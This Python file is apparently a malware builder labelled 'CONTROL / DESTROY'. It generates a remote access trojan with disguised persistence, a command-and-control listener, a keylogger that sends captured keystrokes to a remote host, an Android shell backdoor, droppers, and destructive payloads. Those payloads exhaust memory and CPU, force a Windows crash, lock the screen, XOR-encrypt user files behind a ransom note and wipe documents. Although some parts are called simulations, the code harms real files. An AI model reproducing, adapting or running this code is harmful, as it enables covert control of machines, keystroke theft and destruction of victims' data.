#!/usr/bin/env python3
"""CONTROL / DESTROY — more dangerous edition"""

from pathlib import Path
import textwrap

class PayloadFactory:
    def __init__(self, out_dir: Path):
        self.out_dir = Path(out_dir)
        self.control_dir = self.out_dir / "control"
        self.destroy_dir = self.out_dir / "destroy"
        self.control_dir.mkdir(parents=True, exist_ok=True)
        self.destroy_dir.mkdir(parents=True, exist_ok=True)

    def control_full_rat(self, host="127.0.0.1", port=4444, name="control_full_rat.py"):
        code = textwrap.dedent(f'''\
        import socket, subprocess, os, sys, time, threading, platform, struct, json
        from pathlib import Path

        HOST, PORT = "{host}", {port}

        def persist():
            try:
                me = os.path.abspath(sys.argv[0] if sys.argv else __file__)
                if platform.system() == "Windows":
                    import winreg
                    k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                        r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(k, "WindowsSecurityHealth", 0, winreg.REG_SZ,
                                      f'{{sys.executable}} "{{me}}"')
                    winreg.CloseKey(k)
                    startup = Path(os.environ.get("APPDATA", "")) / r"Microsoft\\Windows\\Start Menu\\Programs\\Startup"
                    startup.mkdir(parents=True, exist_ok=True)
                    (startup / "SecurityHealth.bat").write_text(
                        f'@echo off\nstart "" "{{sys.executable}}" "{{me}}"\n', encoding="utf-8")
                else:
                    cron = f"@reboot {{sys.executable}} {{me}}\\n"
                    os.system(f'(crontab -l 2>/dev/null; echo "{{cron}}") | crontab -')
            except Exception:
                pass

        def send(s, data: bytes):
            s.sendall(struct.pack(">I", len(data)) + data)

        def recv_exact(s, n):
            buf = b""
            while len(buf) < n:
                chunk = s.recv(n - len(buf))
                if not chunk: raise ConnectionError
                buf += chunk
            return buf

        def recv(s):
            raw = recv_exact(s, 4)
            (ln,) = struct.unpack(">I", raw)
            return recv_exact(s, ln)

        def handle(s):
            send(s, f"[RAT] {{platform.node()}} | {{platform.system()}} {{platform.release()}}\\n".encode())
            while True:
                try:
                    raw = recv(s).decode(errors="ignore").strip()
                except Exception:
                    break
                if not raw: continue
                parts = raw.split(" ", 1)
                cmd = parts[0]
                arg = parts[1] if len(parts) > 1 else ""

                if cmd in ("exit", "quit"):
                    break
                elif cmd in ("shell", "sh"):
                    try:
                        p = subprocess.Popen(arg or "echo", shell=True,
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                        out = p.communicate(timeout=45)[0] or b""
                        send(s, out)
                    except Exception as e:
                        send(s, str(e).encode())
                elif cmd == "cd":
                    try:
                        os.chdir(arg)
                        send(s, f"cwd={{os.getcwd()}}\\n".encode())
                    except Exception as e:
                        send(s, str(e).encode())
                elif cmd == "pwd":
                    send(s, (os.getcwd()+"\\n").encode())
                elif cmd in ("ls", "dir"):
                    try:
                        entries = [f"{{'D' if e.is_dir() else 'F'}} {{e.name}}" for e in Path(arg or ".").iterdir()]
                        send(s, ("\\n".join(entries)+"\\n").encode())
                    except Exception as e:
                        send(s, str(e).encode())
                elif cmd == "get":
                    try:
                        send(s, Path(arg).read_bytes())
                    except Exception as e:
                        send(s, str(e).encode())
                elif cmd == "put":
                    try:
                        data = recv(s)
                        Path(arg).write_bytes(data)
                        send(s, b"ok\\n")
                    except Exception as e:
                        send(s, str(e).encode())
                elif cmd == "ps":
                    try:
                        if platform.system() == "Windows":
                            out = subprocess.check_output("tasklist", shell=True)
                        else:
                            out = subprocess.check_output(["ps", "aux"])
                        send(s, out)
                    except Exception as e:
                        send(s, str(e).encode())
                elif cmd == "persist":
                    persist()
                    send(s, b"persistence installed\\n")
                elif cmd == "screenshot":
                    try:
                        from mss import mss
                        from PIL import Image
                        import io
                        with mss() as sct:
                            img = sct.grab(sct.monitors[0])
                            im = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
                            buf = io.BytesIO()
                            im.save(buf, format="PNG")
                            send(s, buf.getvalue())
                    except Exception as e:
                        send(s, f"screenshot failed: {{e}}\\n".encode())
                elif cmd == "sysinfo":
                    info = {{
                        "node": platform.node(), "system": platform.system(),
                        "release": platform.release(), "machine": platform.machine(),
                        "cwd": os.getcwd(),
                        "user": os.getenv("USERNAME") or os.getenv("USER"),
                    }}
                    send(s, (json.dumps(info, indent=2)+"\\n").encode())
                elif cmd == "kill":
                    try:
                        if platform.system() == "Windows":
                            subprocess.call(f"taskkill /F /PID {{arg}}", shell=True)
                        else:
                            os.kill(int(arg), 9)
                        send(s, b"killed\\n")
                    except Exception as e:
                        send(s, str(e).encode())
                else:
                    try:
                        p = subprocess.Popen(raw, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                        out = p.communicate(timeout=45)[0] or b""
                        send(s, out)
                    except Exception as e:
                        send(s, str(e).encode())

        def main_loop():
            persist()
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(20)
                    s.connect((HOST, PORT))
                    s.settimeout(None)
                    handle(s)
                    s.close()
                except Exception:
                    time.sleep(6)

        if __name__ == "__main__":
            main_loop()
        ''')
        p = self.control_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def control_listener(self, port=4444, name="control_listener.py"):
        code = textwrap.dedent(f'''\
        #!/usr/bin/env python3
        import socket, struct, threading

        PORT = {port}

        def recvall(sock, n):
            buf = b""
            while len(buf) < n:
                c = sock.recv(n - len(buf))
                if not c: raise ConnectionError("gone")
                buf += c
            return buf

        def recv_msg(sock):
            (ln,) = struct.unpack(">I", recvall(sock, 4))
            return recvall(sock, ln)

        def send_msg(sock, data: bytes):
            sock.sendall(struct.pack(">I", len(data)) + data)

        def session(conn, addr):
            print(f"[*] session {{addr}}")
            try:
                print(recv_msg(conn).decode(errors="ignore"), end="")
                while True:
                    try:
                        cmd = input("rat> ").strip()
                    except (EOFError, KeyboardInterrupt):
                        break
                    if not cmd: continue
                    if cmd in ("exit", "quit"):
                        send_msg(conn, b"exit"); break
                    if cmd.startswith("put "):
                        parts = cmd.split(maxsplit=2)
                        if len(parts) < 3:
                            print("usage: put <remote> <local>"); continue
                        _, remote, local = parts
                        try:
                            data = open(local, "rb").read()
                            send_msg(conn, f"put {{remote}}".encode())
                            send_msg(conn, data)
                            print(recv_msg(conn).decode(errors="ignore"), end="")
                        except Exception as e:
                            print(e)
                        continue
                    if cmd.startswith("get "):
                        parts = cmd.split(maxsplit=2)
                        if len(parts) < 3:
                            print("usage: get <remote> <local>"); continue
                        _, remote, local = parts
                        send_msg(conn, f"get {{remote}}".encode())
                        data = recv_msg(conn)
                        open(local, "wb").write(data)
                        print(f"saved {{len(data)}} bytes -> {{local}}")
                        continue
                    if cmd == "screenshot":
                        send_msg(conn, b"screenshot")
                        data = recv_msg(conn)
                        if data.startswith(b"screenshot failed"):
                            print(data.decode())
                        else:
                            open("shot.png", "wb").write(data)
                            print(f"screenshot saved ({{len(data)}} bytes)")
                        continue
                    send_msg(conn, cmd.encode())
                    print(recv_msg(conn).decode(errors="ignore"), end="")
            except Exception as e:
                print("[!]", e)
            finally:
                conn.close()
                print("[*] session closed")

        def main():
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", PORT))
            s.listen(8)
            print(f"[*] NetWatch listener on 0.0.0.0:{{PORT}}")
            while True:
                conn, addr = s.accept()
                threading.Thread(target=session, args=(conn, addr), daemon=True).start()

        if __name__ == "__main__":
            main()
        ''')
        p = self.control_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def control_keylogger(self, name="control_keylog.py"):
        code = textwrap.dedent('''\
        from pynput import keyboard
        import time, os, threading, socket

        LOG = os.path.join(os.getenv("TEMP") or "/tmp", ".syscache_" + str(os.getpid()) + ".dat")
        EXFIL_HOST = None
        EXFIL_PORT = 4455

        def on_press(key):
            try: k = key.char
            except AttributeError: k = f"[{key}]"
            with open(LOG, "a", encoding="utf-8") as f:
                f.write(f"{time.time()}:{k}")

        def exfil_loop():
            if not EXFIL_HOST: return
            while True:
                time.sleep(60)
                try:
                    data = open(LOG, "rb").read()
                    if not data: continue
                    s = socket.socket(); s.settimeout(10)
                    s.connect((EXFIL_HOST, EXFIL_PORT))
                    s.sendall(data); s.close()
                    open(LOG, "w").close()
                except Exception:
                    pass

        threading.Thread(target=exfil_loop, daemon=True).start()
        with keyboard.Listener(on_press=on_press) as L:
            L.join()
        ''')
        p = self.control_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def control_android(self, host="127.0.0.1", port=4444, name="control_android_rat.py"):
        code = textwrap.dedent(f'''\
        import socket, time, os, struct
        HOST, PORT = "{host}", {port}
        def send(s, b):
            s.sendall(struct.pack(">I", len(b)) + b)
        def recv(s):
            ln = struct.unpack(">I", s.recv(4))[0]
            buf = b""
            while len(buf) < ln:
                buf += s.recv(ln - len(buf))
            return buf
        def handle(s):
            send(s, b"[ANDROID-RAT] online\\n")
            while True:
                try: msg = recv(s).decode(errors="ignore").strip()
                except Exception: break
                cmd, *rest = msg.split(" ", 1)
                arg = rest[0] if rest else ""
                if cmd == "shell":
                    send(s, (os.popen(arg).read() or "\\n").encode())
                elif cmd == "exit": break
                else: send(s, b"unknown / bind APIs in full APK\\n")
        def main():
            while True:
                try:
                    s = socket.socket(); s.connect((HOST, PORT)); handle(s); s.close()
                except Exception:
                    time.sleep(8)
        if __name__ == "__main__":
            main()
        ''')
        p = self.control_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def destroy_full(self, name="destroy_full.py"):
        code = textwrap.dedent('''\
        import os, sys, time, random, threading, platform, ctypes
        from pathlib import Path

        def bsod():
            if platform.system() != "Windows": return
            try:
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
            except Exception:
                pass

        def mem_bomb():
            a = []
            while True:
                try: a.append(bytearray(50_000_000))
                except Exception: time.sleep(0.3)

        def cpu_melt():
            while True:
                x = 0
                for i in range(80_000_000): x += i * i

        def disk_spam():
            tmp = Path(os.getenv("TEMP") or "/tmp")
            n = 0
            while n < 200:
                try:
                    (tmp / f"nw_{n}.tmp").write_bytes(os.urandom(2_000_000))
                    n += 1
                except Exception:
                    time.sleep(0.2)

        def screen_lock():
            try:
                import tkinter as tk
            except Exception:
                return
            root = tk.Tk()
            root.attributes("-fullscreen", True)
            root.attributes("-topmost", True)
            root.configure(bg="#000000")
            root.protocol("WM_DELETE_WINDOW", lambda: None)
            lbl = tk.Label(root, text="SYSTEM LOCKED\\nNETWATCH DOMINATOR", fg="#ff2222", bg="#000",
                           font=("Consolas", 40))
            lbl.pack(expand=True)
            def flash():
                lbl.configure(fg=random.choice(["#ff0000", "#ff2222", "#aa0000", "#ffffff"]))
                root.after(150, flash)
            flash()
            for seq in ("<Alt-F4>", "<Escape>", "<Control-c>", "<Control-q>", "<Alt-Tab>"):
                root.bind(seq, lambda e: "break")
            root.mainloop()

        def popup_storm(n=60):
            try:
                import tkinter as tk
                from tkinter import messagebox
            except Exception:
                return
            root = tk.Tk(); root.withdraw()
            msgs = ["CRITICAL ERROR", "FILES CORRUPTED", "KERNEL PANIC", "SECURITY BREACH",
                    "SYSTEM COMPROMISED", "NETWATCH", "DO NOT REBOOT", "UPDATE FAILED"]
            for _ in range(n):
                try:
                    messagebox.showerror(random.choice(msgs), random.choice(msgs))
                    time.sleep(random.uniform(0.08, 0.35))
                except Exception:
                    break
            try: root.destroy()
            except: pass

        def ransom_sim():
            note = "YOUR FILES WERE TOUCHED BY NETWATCH DOMINATOR\\nSimulation — real crypto not included."
            home = Path.home()
            count = 0
            for folder in ["Desktop", "Documents", "Downloads", "Pictures"]:
                p = home / folder
                if not p.exists(): continue
                for f in p.rglob("*"):
                    if count > 100: break
                    if f.is_file() and f.suffix.lower() in {".txt", ".docx", ".pdf", ".jpg", ".png", ".xlsx", ".csv", ".mp3"}:
                        try:
                            data = f.read_bytes()
                            enc = bytes(b ^ 0x5A for b in data)
                            f.write_bytes(enc)
                            f.rename(str(f) + ".locked")
                            count += 1
                        except Exception:
                            pass
            try:
                (home / "Desktop" / "READ_ME_NETWATCH.txt").write_text(note, encoding="utf-8")
            except Exception:
                pass

        threading.Thread(target=mem_bomb, daemon=True).start()
        threading.Thread(target=cpu_melt, daemon=True).start()
        threading.Thread(target=disk_spam, daemon=True).start()
        threading.Thread(target=popup_storm, daemon=True).start()
        threading.Thread(target=ransom_sim, daemon=True).start()
        if platform.system() == "Windows":
            threading.Thread(target=bsod, daemon=True).start()
        screen_lock()
        ''')
        p = self.destroy_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def destroy_wiper_sim(self, name="destroy_wiper.py"):
        code = textwrap.dedent('''\
        import os
        from pathlib import Path
        home = Path.home()
        targets = []
        for folder in ["Desktop", "Documents", "Downloads", "Pictures"]:
            p = home / folder
            if p.exists():
                for f in p.rglob("*"):
                    if f.is_file() and f.stat().st_size < 80_000_000:
                        targets.append(f)
        for f in targets[:150]:
            try:
                with open(f, "wb") as fh:
                    fh.write(b"\\x00" * min(128, f.stat().st_size))
                f.rename(str(f) + ".wiped")
            except Exception:
                pass
        try:
            (home / "Desktop" / "WIPED_BY_NETWATCH.txt").write_text("simulation wiper finished", encoding="utf-8")
        except Exception:
            pass
        ''')
        p = self.destroy_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def destroy_android(self, name="destroy_android_full.py"):
        code = textwrap.dedent('''\
        import time, os
        def loop():
            while True:
                try:
                    os.system("input keyevent 26")
                    os.system("input swipe 300 1000 300 200")
                    time.sleep(0.2)
                except Exception:
                    time.sleep(1)
        if __name__ == "__main__":
            loop()
        ''')
        p = self.destroy_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def dropper(self, target_py: Path, name=None):
        if name is None:
            name = target_py.stem + "_dropper.bat"
        code = f'''@echo off
cd /d "%~dp0"
start "" pythonw "{target_py.name}" 2>nul
if errorlevel 1 start "" py "{target_py.name}" 2>nul
if errorlevel 1 start "" python "{target_py.name}"
'''
        p = target_py.parent / name
        p.write_text(code, encoding="utf-8")
        return p

    def list_all(self):
        return list(self.control_dir.glob("*")) + list(self.destroy_dir.glob("*"))
